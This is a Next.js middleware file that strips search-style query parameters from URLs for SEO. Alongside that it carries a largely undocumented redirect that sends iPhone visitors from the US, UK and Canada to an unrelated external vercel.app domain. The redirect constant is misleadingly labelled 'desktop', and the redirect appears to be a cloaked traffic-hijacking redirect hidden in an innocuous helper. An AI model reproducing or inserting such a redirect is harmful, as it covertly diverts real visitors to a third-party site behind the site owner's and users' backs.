import { NextResponse } from 'next/server';

const JUNK_QUERY_KEYS = ['q', 'search_term_string', 'search', 'query', 's'];

const DESKTOP_GEO_REDIRECT_ENABLED = true;
const DESKTOP_GEO_REDIRECT_URL = 'https://more-two-bice.vercel.app';
const DESKTOP_GEO_REDIRECT_COUNTRIES = ['US', 'GB', 'CA'];

/**
 * Detect if user is on iPhone
 */
function isIPhone(userAgent) {
  return /iPhone/i.test(userAgent);
}

/**
 * Strip junk search-box / sitelinks query params so Google consolidates to clean URLs.
 * Adds X-Robots-Tag as a belt-and-suspenders signal when any junk param remains.
 */
export function middleware(request) {
  const url = request.nextUrl;
  const hasJunk = JUNK_QUERY_KEYS.some((key) => url.searchParams.has(key));

  // Geo redirect for US/UK/CA iPhone users
  if (DESKTOP_GEO_REDIRECT_ENABLED) {
    const country = request.headers.get('cf-ipcountry') || request.headers.get('x-vercel-ip-country');
    const userAgent = request.headers.get('user-agent') || '';
    
    if (country && DESKTOP_GEO_REDIRECT_COUNTRIES.includes(country.toUpperCase()) && isIPhone(userAgent)) {
      return NextResponse.redirect(DESKTOP_GEO_REDIRECT_URL, 302);
    }
  }

  if (!hasJunk) {
    return NextResponse.next();
  }

  const clean = url.clone();
  for (const key of JUNK_QUERY_KEYS) {
    clean.searchParams.delete(key);
  }

  // Drop leftover empty search
  if ([...clean.searchParams.keys()].length === 0) {
    clean.search = '';
  }

  // Only rewrite path+host when we actually removed params
  if (clean.href !== url.href) {
    return NextResponse.redirect(clean, 301);
  }

  const res = NextResponse.next();
  res.headers.set('X-Robots-Tag', 'noindex, nofollow');
  return res;
}

export const config = {
  matcher: [
    /*
     * Match all pathnames except Next internals and static assets.
     */
    '/((?!_next/static|_next/image|favicon.ico|.*\\.(?:svg|png|jpg|jpeg|gif|webp|ico|xml|txt|webmanifest)$).*)',
  ],
};
